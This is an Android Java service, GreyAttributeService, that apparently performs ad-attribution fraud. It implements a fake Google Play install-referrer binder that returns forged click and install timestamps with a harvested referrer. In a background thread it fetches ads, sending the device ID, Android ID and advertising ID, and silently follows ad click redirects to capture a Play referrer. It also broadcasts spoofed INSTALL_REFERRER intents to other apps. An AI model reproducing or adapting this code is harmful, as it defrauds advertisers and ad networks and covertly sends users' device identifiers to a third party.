package com.polestar.grey;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.google.gson.Gson;
import com.polestar.ad.AdLog;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;

import nativesdk.ad.common.app.Constants;
import nativesdk.ad.common.common.network.data.FetchAdResult;
import nativesdk.ad.common.common.utils.L;
import nativesdk.ad.common.common.utils.Utils;
import nativesdk.ad.common.database.AdInfo;
import nativesdk.ad.common.utils.DeviceUtil;
import nativesdk.ad.common.utils.PreferenceUtils;
import nativesdk.ad.common.utils.UrlUtils;

import com.google.android.finsky.externalreferrer.*;

/**
 * Created by guojia on 2018/2/10.
 */

public class GreyAttributeService extends Service {
    private static final String TAG = "GreyAttribute";
    private static final String SOURCE_ID = "29026";
    private final static String FETCH_URL =
            "http://api.c.avazunativeads.com/appwall?sourceid="+SOURCE_ID+"&adpkg={adpkg}&req_type=3&market=google"
                    + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
                    "reqId={reqid}&maid={maid}&gpid={gpid}";

    class FakeReferrerBinder extends IGetInstallReferrerService.Stub{
        String pkg;
        FakeReferrerBinder(Intent intent) {
            pkg = intent.getAction();
        }
        @Override
        public String getInterfaceDescriptor() {
            return "com.google.android.finsky.externalreferrer.IGetInstallReferrerService";
        }

        @Override
        public Bundle getInstallReferrer() {
            AdLog.d("GreyAttribute", "call service getInstallReferrer");
            Bundle fake = new Bundle();
            long click = GreyAttribute.getClickTimeStamp(GreyAttributeService.this, pkg);
            fake.putLong("referrer_click_timestamp_seconds", click);
            long current = System.currentTimeMillis();
            int random = new Random().nextInt(1000);
            long install = click + (current - click)/2 + random;
            fake.putLong("install_begin_timestamp_seconds", install);
            fake.putString("install_referrer", GreyAttribute.getReferrer(GreyAttributeService.this, pkg));
            return fake;
        }
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new FakeReferrerBinder(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        if (GreyAttribute.ACTION_CLICK.equals(intent.getAction())) {
            final String pkg = intent.getStringExtra(Intent.EXTRA_PACKAGE_NAME);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    doCheckAndClick(GreyAttributeService.this, pkg);
                }
            }, "check-click").start();
        } else if(GreyAttribute.ACTION_ATTRIBUTE.equals(intent.getAction())){
            final String pkg = intent.getStringExtra(Intent.EXTRA_PACKAGE_NAME);
            String refer = GreyAttribute.getReferrer(this,pkg);
            if (!TextUtils.isEmpty(refer)) {
                Intent br = new Intent("com.android.vending.INSTALL_REFERRER");
                br.putExtra("referrer", refer);
                br.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                br.setPackage(pkg);
                AdLog.d(TAG, "send refer for pkg: " + pkg + " refer: " +refer);
                sendBroadcast(br);
            }
        }
        return START_NOT_STICKY;
    }

    private  void doCheckAndClick(Context ctx, String pkg) {
        try {
            String devId = DeviceUtil.getDeviceId(ctx);
            String mypkg = ctx.getPackageName();
            String lang = Utils.getLanguage();
            String reqId = UUID.randomUUID().toString();
            String aid = DeviceUtil.getAndroidId(ctx);
            String ua = URLEncoder.encode(PreferenceUtils.getUserAgent(ctx), "UTF-8");
            String gpid = DeviceUtil.getGoogleAdvertisingId(ctx);
            String reqUrl = FETCH_URL.replace("{adpkg}", "com.yygames.ggplay.lzgtw").replace("{devId}", devId).replace("{mypkg}", mypkg)
                    .replace("{ua}", ua).replace("{lang}", lang).replace("{reqid}", reqId).replace("{maid}", aid)
                    .replace("{gpid}", gpid);

            AdLog.d(TAG, "ReqURL: " + reqUrl);
            String ret = doGET(reqUrl, PreferenceUtils.getUserAgent(ctx));

            if (TextUtils.isEmpty(ret)) {
                return;
            }
            try {
                Gson gson = new Gson();
                FetchAdResult ads = gson.fromJson(ret, FetchAdResult.class);
                if (!FetchAdResult.isFailed(ads)) {
                    List<AdInfo> adInfoList = new ArrayList<AdInfo>();
                    for (FetchAdResult.Ad data : ads.ads.a) {
                        AdInfo info = new AdInfo(data, Constants.ApxAdType.APPWALL);
                        AdLog.d(TAG, "AdInfo: " + info.clkurl);
                        String referrer = doClick(info);
                        if (referrer != null) {
                            AdLog.d(TAG, "referrer: " + referrer);
                            GreyAttribute.putReferrer(this, pkg, referrer);
                            break;
                        }

                    }
                } else {
                    AdLog.d(TAG, "failed to load");
                }
            } catch (Throwable e) {
                L.e(e);
            }

        } catch (Throwable ex) {
            AdLog.d(ex);
        }

    }

    private   String doGET(String _url, String userAgent) {
        L.d("[doGET] " + _url);
        try {
            URL url = new URL(_url);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(30000);
            conn.setConnectTimeout(30000);
            conn.setDoInput(true);
            conn.setRequestProperty("User-Agent", userAgent);
            int rspCode = conn.getResponseCode();
            L.d("rspCode" + rspCode);
//            if (rspCode >= 400) {
//                return null;
//            }

            byte[] buffer = new byte[8192];
            BufferedInputStream bis = null;
            ByteArrayOutputStream baos = null;
            try {
                bis = new BufferedInputStream(conn.getInputStream());
                baos = new ByteArrayOutputStream();
                int len;
                while ((len = bis.read(buffer)) > 0) {
                    baos.write(buffer, 0, len);
                }
                baos.flush();
                final String ret = new String(baos.toByteArray());
                L.d("[doGET] " + ret);
                return ret;
            } finally {
                if (bis != null) {
                    bis.close();
                }

                if (baos != null) {
                    baos.close();
                }
            }
        } catch (Throwable e) {
            L.e(e);
        }
        return null;
    }

    private  String appendDeviceId(String url) {
        StringBuilder sb = new StringBuilder();
        sb.append(url);
        sb.append("&device_id=");
        sb.append(DeviceUtil.getDeviceId(this));
        return sb.toString();
    }

    private static final String GOOGLE_PLAY_SCHEMA = "market";
    private static final String GOOGLE_PLAY_HOST = "play.google.com";
    private static final String ANDROID_MARKET_HOST = "market.android.com";
    private static boolean isGooglePlayLink(String url) {
        if (TextUtils.isEmpty(url)) {
            return false;
        }

        Uri uri = Uri.parse(url);
        final String schema = uri.getScheme();
        final String host = uri.getHost();
        if (GOOGLE_PLAY_HOST.equals(host) || ANDROID_MARKET_HOST.equals(host)
                || GOOGLE_PLAY_SCHEMA.equals(schema)) {
            return true;
        }
        return false;
    }

    //return referrer
    private  String doClick(AdInfo adInfo) {
        long jumpStartTime = System.currentTimeMillis();
        int redirectCount = 0;
        try {
            String locationUrl = appendDeviceId(adInfo.clkurl);
            while ((locationUrl != null) && (redirectCount < 10)
                    && (SystemClock.currentThreadTimeMillis() - jumpStartTime < 15000))
            {
                if (isGooglePlayLink(locationUrl))
                {
                    Map<String, String> parms = UrlUtils.getRequestParameters(locationUrl);
                    String pkg = parms.get("id");
                    if (UrlUtils.isValidGpUrl(locationUrl) && pkg.equalsIgnoreCase(adInfo.pkgname)) {
                        adInfo.loadedclickurl = locationUrl;
                        adInfo.preclickTime = System.currentTimeMillis();
                        String s = parms.get("referrer");
                        if (s != null) {
                            s = s.replace("%3D", "=").replace("%26", "&");
                        }
                        return s;
                    } else {
                        return null;
                    }
                }

                locationUrl = getRedirectLocation(locationUrl);
                AdLog.d(TAG, locationUrl);
                redirectCount++;
            }
            L.d("title: " + adInfo.title + " Fail to resolve locationUrl : " + locationUrl );
        } catch (Throwable e) {
            L.d("title: " + adInfo.title + " errro: " + e.getCause());
            e.printStackTrace();
        }
        return null;
    }

    private String getRedirectLocation(String urlString) {
        HttpURLConnection httpUrlConnection = null;
        try {
            URL url = new URL(urlString);
//            L.d("getRedirectLocation " + url.toString());
            httpUrlConnection = (HttpURLConnection)url.openConnection();
            httpUrlConnection.setConnectTimeout(5000);
            httpUrlConnection.setInstanceFollowRedirects(false);
            httpUrlConnection.setRequestProperty("User-Agent", PreferenceUtils.getUserAgent(this));
            int responseCode = httpUrlConnection.getResponseCode();
            if (responseCode == 404) {
                return null;
            }
            if ((responseCode >= 300) && (responseCode < 400)) {
                String location = httpUrlConnection.getHeaderField("Location");
                if (!TextUtils.isEmpty(location)) {
                    if (location.startsWith("http") || location.startsWith("https") || isGooglePlayLink(location)) {
                        return location;
                    } else {
                        if (urlString.startsWith("https")) {
                            return "https://" + url.getHost() + "/" + location;
                        } else {
                            return "http://" + url.getHost() + "/" + location;
                        }
                    }
                }
            }
            InputStream is;
            if (responseCode == 200) {
                is = httpUrlConnection.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                StringBuilder builder = new StringBuilder();
                String line;
                while (null != (line = reader.readLine())) {
                    if(builder.length() > 1024*1024 || line.length() > 1024*1024) {
                        break;
                    }
                    builder.append(line);
                }
                is.close();
                String location =  UrlRedirectParser.checkMetaOrJsRedirect(builder.toString());
                if (!TextUtils.isEmpty(location)) {
                    if (location.startsWith("&")) {
                        return urlString + location;
                    }
                    if (location.startsWith("http") || location.startsWith("https") || isGooglePlayLink(location)) {
                        return location;
                    } else {
                        if (urlString.startsWith("https")) {
                            return "https://" + url.getHost() + "/" + location;
                        } else {
                            return "http://" + url.getHost() + "/" + location;
                        }
                    }
                }
            }
            return null;
        } catch (Exception e) {
            return null;
        } catch (Error e) {
            return null;
        }
        finally {
            if (httpUrlConnection != null)
                httpUrlConnection.disconnect();
        }
    }
}

